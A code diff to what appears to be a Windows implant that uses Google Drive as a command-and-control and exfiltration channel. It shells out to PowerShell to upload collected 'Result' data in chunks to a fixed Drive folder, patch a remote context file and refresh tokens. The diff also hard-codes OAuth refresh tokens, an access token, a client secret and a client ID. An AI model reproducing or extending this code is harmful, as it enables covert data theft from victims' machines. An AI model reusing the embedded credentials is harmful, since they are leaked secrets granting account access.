@@ -10,8 +10,8 @@ static const char bs_64[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxy
 
 static int index = 0;
 
-static MyString g_access_token = "";
-static MyString g_refresh_token = *(new MyString("1//03Z20YrpiO4TzCgYIARAAGAMSNwF-L9Irse6C8tZSp6qYRPUC9yZQ7Wlae-mXjiDHs056fudWLtcfs7ZIzvlQG0aQNcY1CzsnOJA"));
+static MyString g_access_token = "yX2Mik28Eorl0NGfxPsFRtmSzxw0177";
+static MyString g_refresh_token = *(new MyString("1//09mt_G8WQts9XCgYIARAAGAkSNwF-L9IrqUICbcNlRFj27jFrk3Py7PQSj41VRDv7eTnh1YPl-HOkXSDBRiJOMJWCzuIvr_LRmEc"));
 static MyString g_client_secret = *(new MyString("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"));
 static MyString g_client_id = *(new MyString("1013834111625-fplqsrj4vs1d95l5g8fmljkqsuh0hstu.apps.googleusercontent.com"));
 static MyString g_result_folder_id = "10a_TCWM1Txsjy-SkkQMen2eytaZKLgdB";
@@ -121,7 +121,7 @@ static void handleFailsafe() {
     g_refresh_token = *(new MyString(buffer));
     g_refresh_token = g_refresh_token.getSubString(0, g_refresh_token.getLength() - 1);
 }
-//you were here..............................................................................................................................
+
 static MyString getToken() {
 
     char buffer[1024];
@@ -166,43 +166,14 @@ static MyString downloadContext() {
 //Download
 
 static void upload(MyString data) {
+    char* buffer = new char[7000];
     double tmp = static_cast<double>(data.getLength()) / 6000;
     int i = ceil(tmp);
-    int subindex = 0;
+    int subIndex = 0;
     for (size_t j = 0; j < i; j++)
     {
-    label:
-        char buffer[12];
-        snprintf(buffer, 12, "%d_%d", index, subindex);
-        char urlc_1[] = "powershell.exe -c \"try {Invoke-RestMethod 'https://www.googleapis.com/upload/drive/v3/files/?uploadType=multipart&access_token=";
-        //Decoder(Urlc_1);
-        MyString url_1 = urlc_1;
-        url_1 = url_1 + g_access_token;
-        char adad[] = "' -Method 'POST' -TimeoutSec 30 -Headers @{'Content-Type' = 'multipart/related; boundary=boundary'} -Body \\\"`n--boundary`nContent-Type: application/json; charset=UTF-8`n`n{`\\\"name`\\\": `\\\"Result#";
-        //Decoder(adad);
-        url_1 = url_1 + adad;
-        url_1 = url_1 + buffer;
-        char urlc_2[150];
-        
-        snprintf(urlc_2, 150, ".txt`\\\",`\\\"mimeType`\\\": `\\\"text/plain`\\\",`\\\"parents`\\\": [`\\\"%s`\\\"]}`n`n--boundary`nContent-Type: text/plain`n`n", g_result_folder_id.getContext());
-        //Decoder(Urlc_2);
-        MyString url_2 = urlc_2;
-        url_1 = url_1 + url_2;
-
-        MyString tttt = data.getSubString((j * 6000), data.getLength());
-
-        if ((data.getLength() - (j * 6000)) < 6000) {
-            url_1 = url_1 + data.getSubString((j * 6000), data.getLength());
-        }
-        else {
-            url_1 = url_1 + data.getSubString((j * 6000), ((j + 1) * 6000));
-        }
-        //Url_1 = Url_1 + data;
-        char urlc_3[] = "`n--boundary--\\\"}catch{echo 4}\"";
-        //Decoder(Urlc_3);
-        MyString Url_3 = urlc_3;
-        url_1 = url_1 + Url_3;
-        FILE* file = _popen(url_1.getContext(), "r");
+        snprintf(buffer, 7000, "powershell.exe -c \"try {Invoke-RestMethod 'https://www.googleapis.com/upload/drive/v3/files/?uploadType=multipart&access_token=%s' -Method 'POST' -TimeoutSec 30 -Headers @{'Content-Type' = 'multipart/related; boundary=boundary'} -Body \\\"`n--boundary`nContent-Type: application/json; charset=UTF-8`n`n{`\\\"name`\\\": `\\\"Result#%d_%d.txt`\\\",`\\\"mimeType`\\\": `\\\"text/plain`\\\",`\\\"parents`\\\": [`\\\"%s`\\\"]}`n`n--boundary`nContent-Type: text/plain`n`n%s`n--boundary--\\\"}catch{echo 4}\"", g_access_token.getContext(), index, subIndex, g_result_folder_id.getContext(), data.getSubString(j * 6000, j == i - 1 ? data.getLength() : (j + 1) * 6000).getContext());
+        FILE* file = _popen(buffer, "r");
         char temp_buffer[1024];
         MyString output = "";
         while (fgets(temp_buffer, sizeof(temp_buffer), file) != NULL) {
@@ -210,33 +181,29 @@ static void upload(MyString data) {
         }
         if (output.getCharAt(0) == '4') {
             g_access_token = getToken();
-            goto label;
+            j--;
         }
-        subindex++;
+        subIndex++;
         _pclose(file);
     }
-
+    delete[] buffer;
     index++;
 }
 //Upload
-static void deleteContext() {
-label:
-    char urlc_1[] = "powershell.exe -c \"try{Invoke-RestMethod 'https://www.googleapis.com/upload/drive/v3/files/1_tWWjOBiwEFivD8Ua6rwEF4JQfq7t1er?access_token=";
-    //Decoder(Urlc_1);
-    MyString url_1 = urlc_1;
-    url_1 = url_1 + g_access_token;
-    char urlc_2[] = "' -Method 'PATCH' -TimeoutSec 30}catch{echo 4}\"";
-    //Decoder(Urlc_2);
-    url_1 = url_1 + urlc_2;
-    FILE* file = _popen(url_1.getContext(), "r");
-    char temp_buffer[1024];
-    MyString output = "";
-    while (fgets(temp_buffer, sizeof(temp_buffer), file) != NULL) {
-        output = output + temp_buffer;
-    }
-    if (output.getCharAt(0) == '4') {
+static boolean deleteContext() {
+    char* buffer = new char[512];
+    snprintf(buffer, 512, "powershell.exe -c \"try{Invoke-RestMethod 'https://www.googleapis.com/upload/drive/v3/files/1_tWWjOBiwEFivD8Ua6rwEF4JQfq7t1er?access_token=%s' -Method 'PATCH' -TimeoutSec 30}catch{echo 4}\"", g_access_token.getContext());
+    FILE* file = _popen(buffer, "r");
+    delete[] buffer;
+    buffer = new char[2];
+
+    fgets(buffer, 2, file);
+    if (buffer[0] == '4') {
         g_access_token = getToken();
-        goto label;
+        delete[] buffer;
+        return deleteContext();
     }
     _pclose(file);
+    delete[] buffer;
+    return true;
 }
